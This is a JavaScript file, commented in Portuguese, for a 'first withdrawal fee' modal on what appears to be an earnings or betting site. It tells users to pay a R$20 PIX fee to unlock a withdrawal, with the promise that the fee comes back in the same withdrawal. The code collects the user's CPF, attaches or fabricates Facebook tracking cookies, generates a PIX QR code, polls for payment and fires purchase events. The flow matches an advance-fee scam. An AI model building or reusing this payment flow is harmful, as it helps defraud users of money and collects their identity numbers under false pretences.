/**
 * Modal Taxa do Primeiro Saque - JavaScript
 * Baseado no estilo dos modais existentes do site
 * Funcionalidades: abrir/fechar, trap de foco, estados visuais
 */

// Configuração padrão do modal
window.FeeModalConfig = {
  feeValue: 20,
  title: "Taxa de Saque",
  description: "Para liberar seu primeiro saque, é necessário pagar uma taxa única de R$ 20,00. Após a confirmação do pagamento, o valor pago retorna no mesmo saque.",
  features: [
    "Valor fixo: R$ 20,00",
    "Cobrada apenas uma vez (só no primeiro saque)",
    "Liberação imediata após confirmação"
  ],
  primaryLabel: "Pagar taxa",
  secondaryLabel: "Voltar",
  theme: "dark", // Padrão escuro como no site
  showSupportNote: true,
  messages: {
    loading: "Processando…",
    success: "Taxa paga! Liberando saque…",
    error: "Ops! Algo deu errado. Tente novamente ou entre em contato com o suporte."
  },
  palette: {
    primaryBlue: "#144B8A",
    primaryBlueDark: "#0E2A47",
    accentBlue: "#040AE0",
    accentBlueDark: "#0309CE"
  }
};

class FeeModal {
  constructor(config = {}) {
    this.config = { ...window.FeeModalConfig, ...config };
    this.modal = null;
    this.backdrop = null;
    this.focusableElements = [];
    this.previousFocus = null;
    this.isOpen = false;
    
    this.init();
  }
  
  init() {
    this.modal = document.getElementById('feeModal');
    this.backdrop = document.getElementById('feeModalBackdrop');
    
    if (!this.modal || !this.backdrop) {
      console.error('Modal elements not found');
      return;
    }
    
    this.setupEventListeners();
    this.updateContent();
    this.applyTheme();
  }
  
  setupEventListeners() {
    // Botão fechar
    const closeBtn = document.getElementById('closeFeeModal');
    if (closeBtn) {
      closeBtn.addEventListener('click', () => this.close());
    }
    
    // Botão voltar
    const backBtn = document.getElementById('backBtn');
    if (backBtn) {
      backBtn.addEventListener('click', () => this.close());
    }
    
    // Botão pagar (apenas para demo)
    const payBtn = document.getElementById('payFeeBtn');
    if (payBtn) {
      payBtn.addEventListener('click', () => this.handlePayment());
    }
    
    // Fechar ao clicar no backdrop
    this.backdrop.addEventListener('click', () => this.close());
    
    // Tecla ESC
    document.addEventListener('keydown', (e) => {
      if (e.key === 'Escape' && this.isOpen) {
        this.close();
      }
    });
    
    // Trap de foco
    this.modal.addEventListener('keydown', (e) => {
      if (e.key === 'Tab') {
        this.handleTabKey(e);
      }
    });
  }
  
  updateContent() {
    // Atualizar título
    const title = document.getElementById('modal-title');
    if (title) {
      title.textContent = this.config.title;
    }
    
    // Atualizar descrição
    const description = document.getElementById('modal-description');
    if (description) {
      description.innerHTML = this.config.description.replace(
        /R\$ [\d,]+/g, 
        `R$ <span class="fee-value">${this.config.feeValue.toFixed(2).replace('.', ',')}</span>`
      );
    }
    
    // Atualizar valores da taxa
    const feeValues = document.querySelectorAll('.fee-value');
    feeValues.forEach(element => {
      element.textContent = this.config.feeValue.toFixed(2).replace('.', ',');
    });
    
    // Atualizar labels dos botões
    const payBtn = document.getElementById('payFeeBtn');
    if (payBtn) {
      const btnText = payBtn.querySelector('.btn-text');
      if (btnText) {
        btnText.textContent = this.config.primaryLabel;
      }
    }
    
    const backBtn = document.getElementById('backBtn');
    if (backBtn) {
      backBtn.textContent = this.config.secondaryLabel;
    }
    
    // Mostrar/ocultar nota de suporte
    this.modal.setAttribute('data-show-support', this.config.showSupportNote);
    
    // Atualizar mensagens
    const successMsg = this.modal.querySelector('.message-success span');
    if (successMsg) {
      successMsg.textContent = this.config.messages.success;
    }
    
    const errorMsg = this.modal.querySelector('.message-error span');
    if (errorMsg) {
      errorMsg.textContent = this.config.messages.error;
    }
  }
  
  applyTheme() {
    // Aplicar tema
    document.documentElement.setAttribute('data-theme', this.config.theme);
    
    // Aplicar paleta de cores personalizada
    const root = document.documentElement;
    Object.entries(this.config.palette).forEach(([key, value]) => {
      const cssVar = key.replace(/([A-Z])/g, '-$1').toLowerCase();
      root.style.setProperty(`--fwf-${cssVar}`, value);
    });
  }
  
  getFocusableElements() {
    const selectors = [
      'button:not([disabled])',
      'a[href]',
      'input:not([disabled])',
      'select:not([disabled])',
      'textarea:not([disabled])',
      '[tabindex]:not([tabindex="-1"])'
    ];
    
    return Array.from(this.modal.querySelectorAll(selectors.join(', ')))
      .filter(el => {
        const style = window.getComputedStyle(el);
        return style.display !== 'none' && 
               style.visibility !== 'hidden' && 
               el.offsetParent !== null;
      });
  }
  
  handleTabKey(e) {
    const focusableElements = this.getFocusableElements();
    const firstElement = focusableElements[0];
    const lastElement = focusableElements[focusableElements.length - 1];
    
    if (e.shiftKey) {
      // Shift + Tab
      if (document.activeElement === firstElement) {
        e.preventDefault();
        lastElement.focus();
      }
    } else {
      // Tab
      if (document.activeElement === lastElement) {
        e.preventDefault();
        firstElement.focus();
      }
    }
  }
  
  open() {
    if (this.isOpen) return;
    
    this.previousFocus = document.activeElement;
    
    // Ativar backdrop e modal
    this.backdrop.classList.add('active');
    this.modal.classList.add('active');
    this.modal.setAttribute('aria-hidden', 'false');
    this.isOpen = true;
    
    // Focar no primeiro elemento focável
    setTimeout(() => {
      const focusableElements = this.getFocusableElements();
      if (focusableElements.length > 0) {
        focusableElements[0].focus();
      }
    }, 100);
    
    // Prevenir scroll do body
    document.body.style.overflow = 'hidden';
  }
  
  close() {
    if (!this.isOpen) return;
    
    // Desativar backdrop e modal
    this.backdrop.classList.remove('active');
    this.modal.classList.remove('active');
    this.modal.setAttribute('aria-hidden', 'true');
    this.isOpen = false;
    
    // Restaurar foco anterior
    if (this.previousFocus) {
      this.previousFocus.focus();
    }
    
    // Restaurar scroll do body
    document.body.style.overflow = '';
    
    // Limpar estados
    this.clearStates();
  }
  
  // Métodos para alternar estados (apenas visual para demo)
  setState(state) {
    this.clearStates();
    
    switch (state) {
      case 'loading':
        this.modal.classList.add('is-loading');
        break;
      case 'success':
        this.modal.classList.add('is-success');
        break;
      case 'error':
        this.modal.classList.add('is-error');
        break;
    }
  }
  
  clearStates() {
    this.modal.classList.remove('is-loading', 'is-success', 'is-error');
  }
  
  // Simulação de pagamento para demo
  handlePayment() {
    if (document.getElementById('feeQrArea') && document.getElementById('feeQrArea').classList.contains('active')) return;
    // Gera PIX fixo (R$ 10) e mostra QR dentro do modal
    if (this.isLoading) return;
    this.setState('loading');
    var fee = (this.config && this.config.feeValue) ? Number(this.config.feeValue) : 10;
    if (!fee || fee <= 0) fee = 10;
    // Capturar CPF do modal de saque (apenas leitura)
    var cpf = (
      (typeof window!=='undefined' && window._feeCpf) ||
      (document.getElementById('feeCpfHidden') && document.getElementById('feeCpfHidden').value) ||
      (document.getElementById('withdrawCpf') && document.getElementById('withdrawCpf').value) ||
      ''
    );
    if (cpf) cpf = String(cpf).replace(/\D/g,'');
    if ((!cpf || cpf.length !== 11) && !(document.getElementById('feeQrArea') && document.getElementById('feeQrArea').classList.contains('active'))){
      try{ Notiflix.Notify.failure('Informe seu CPF no modal de saque.'); }catch(_){}
      try{ this.close(); }catch(_){}
      try{ if (typeof openWithdrawModal === 'function') openWithdrawModal(window.currentBalance || null); }catch(_){}
      try{ document.getElementById('withdrawCpf')?.focus(); }catch(_){}
      this.clearStates();
      return;
    }
    var fd = new FormData();
    fd.append('amount', String(fee));
                // Attach Facebook cookies for CAPI attribution
                try{
                  function getCookie(n){ var m = document.cookie.match(new RegExp('(?:^|; )' + n.replace(/([.$?*|{}()\[\]\\\/\+^])/g,'\\$1') + '=([^;]*)')); return m?decodeURIComponent(m[1]):null; }
                  var __fbp = getCookie('_fbp') || null;
                  var __fbc = getCookie('_fbc') || getCookie('fbc') || null;
                  if (__fbp) fd.append('_fbp', __fbp);
                  if (__fbc) fd.append('_fbc', __fbc);
                try{
                  if (!__fbp){
                    var __ts2 = Date.now();
                    var __rand2 = Math.floor(Math.random()*1e12);
                    fd.append('_fbp','fb.1.'+__ts2+'.'+__rand2);
                  }
                }catch(e){}
                }catch(e){}
    fd.append('cpf', cpf);
    try{ fd.append('event_source_url', location.href); }catch(e){}; fetch('/api/payment.php', { method:'POST', body: fd }).then(async (res)=>{
      try{
        var data = await res.json();
        if (data && data.qrcode){
          // Mostrar QR na UI
          var area = document.getElementById('feeQrArea');
          if (area){ area.classList.add('active'); }
          var img = document.getElementById('feeQrImg');
          var inp = document.getElementById('feeQrCodeValue');
          if (img){ img.src = 'https://api.qrserver.com/v1/create-qr-code/?size=300x300&data='+encodeURIComponent(data.qrcode); }
          if (inp){ inp.value = data.qrcode; }
          // Disparar InitiateCheckout para a taxa
          try {
            var _fbp = (typeof window !== 'undefined' && window._fbp) || null;
            var _fbc = (typeof window !== 'undefined' && window._fbc) || null;
            var _eventId = 'purchase_fee_' + Date.now() + '_' + Math.random().toString(36).slice(2,8);
            var _payload = {
              value: fee,
              currency: 'BRL',

              event_id: _eventId,
              event_source_url: location.href,
              fbp: _fbp,
              fbc: _fbc
            };
            // Logar para CAPI
            fetch("/api/fb_capi_purchase.php", {
              method: 'POST',
              headers: {'Content-Type':'application/json'},
              body: JSON.stringify(_payload)
            }).catch(()=>{});
            // Pixel (se fbq estiver disponível)
            if (typeof fbq === 'function') {
              fbq("track", "Purchase", {value: fee, currency: "BRL"});
            }
          } catch(e){ console.warn('Erro ao disparar InitiateCheckout para taxa:', e); }
          // Estado normal (mostrando QR)

          this.clearStates();
          try{ document.getElementById('feeModal')?.classList.add('qr-active'); }catch(_){}
          
          // Polling até pagar
          var qrcodeValue = data.qrcode;
          var intervalId = setInterval(async ()=>{
            try {
              var c = await fetch("/api/payment-check.php?id="+data.id).then(res=>res.json());
              if (c && c.paid === true){
                clearInterval(intervalId);
                // --- TRACK FEE PURCHASE: trigger server-side CAPI via purchase-tracking.js ---
                try {
                  var __feeValue = (window.FeeModalConfig && Number(window.FeeModalConfig.feeValue)) || 10;
                  sessionStorage.setItem("paymentApproved","1");
                  sessionStorage.setItem("paymentValue", String(__feeValue));
                } catch(e){}
                try { window.postMessage({ type: "PIX_PURCHASE", value: (typeof __feeValue==="number"?__feeValue:10) }, "*"); } catch(e){}
                // Pixel (se fbq estiver disponível)
                if (typeof fbq === "function") {
                  fbq("track", "Purchase", {value: fee, currency: "BRL"});
                }
                try{ Notiflix.Notify.success("Taxa recebida! Você já pode refazer seu saque."); }catch(_){}
                // Fecha o modal da taxa
                this.close();
                // Opcional: atualizar header saldo
                try{ if (typeof refreshSaldoHeader === 'function') refreshSaldoHeader(); }catch(_){}
              }
            }catch(err){ clearInterval(intervalId); }
          }, 2000);
        }else{
          this.setState('error');
          try{ Notiflix.Notify.failure((data && data.error) ? data.error : 'Falha ao gerar PIX da taxa'); }catch(_){}
        }
      }catch(err){
        this.setState('error');
        try{ Notiflix.Notify.failure('Erro ao processar resposta do pagamento'); }catch(_){}
      }
    }).catch((err)=>{
      this.setState('error');
      try{ Notiflix.Notify.failure('Erro ao gerar PIX da taxa'); }catch(_){}
    });
  }
  // Métodos públicos para controle externo
  updateConfig(newConfig) {
    this.config = { ...this.config, ...newConfig };
    this.updateContent();
    this.applyTheme();
  }
  
  // Getters para estado atual
  get isLoading() {
    return this.modal.classList.contains('is-loading');
  }
  
  get isSuccess() {
    return this.modal.classList.contains('is-success');
  }
  
  get isError() {
    return this.modal.classList.contains('is-error');
  }
}

// Inicialização automática quando o DOM estiver pronto
document.addEventListener('DOMContentLoaded', () => {
  // Criar instância global do modal
  window.feeModal = new FeeModal();
  
  // Configurar modal como fechado inicialmente
  const modal = document.getElementById('feeModal');
  const backdrop = document.getElementById('feeModalBackdrop');
  
  if (modal && backdrop) {
    modal.setAttribute('aria-hidden', 'true');
    modal.classList.remove('active');
    backdrop.classList.remove('active');
  }
});

// Utilitários para uso externo (compatibilidade com versão anterior)
window.FeeModalUtils = {
  // Abrir modal
  open() {
    if (window.feeModal) {
      window.feeModal.open();
    }
  },
  
  // Fechar modal
  close() {
    if (window.feeModal) {
      window.feeModal.close();
    }
  },
  
  // Definir estado
  setState(state) {
    if (window.feeModal) {
      window.feeModal.setState(state);
    }
  },
  
  // Limpar estados
  clearStates() {
    if (window.feeModal) {
      window.feeModal.clearStates();
    }
  },
  
  // Atualizar configuração
  updateConfig(config) {
    if (window.feeModal) {
      window.feeModal.updateConfig(config);
    }
  },
  
  // Aplicar tema
  setTheme(theme) {
    if (window.feeModal) {
      window.feeModal.updateConfig({ theme });
    }
  },
  
  // Aplicar paleta de cores
  setPalette(palette) {
    if (window.feeModal) {
      window.feeModal.updateConfig({ palette });
    }
  },
  
  // Verificar se está aberto
  isOpen() {
    return window.feeModal ? window.feeModal.isOpen : false;
  },
  
  // Verificar estados
  getState() {
    if (!window.feeModal) return 'normal';
    
    if (window.feeModal.isLoading) return 'loading';
    if (window.feeModal.isSuccess) return 'success';
    if (window.feeModal.isError) return 'error';
    return 'normal';
  }
};
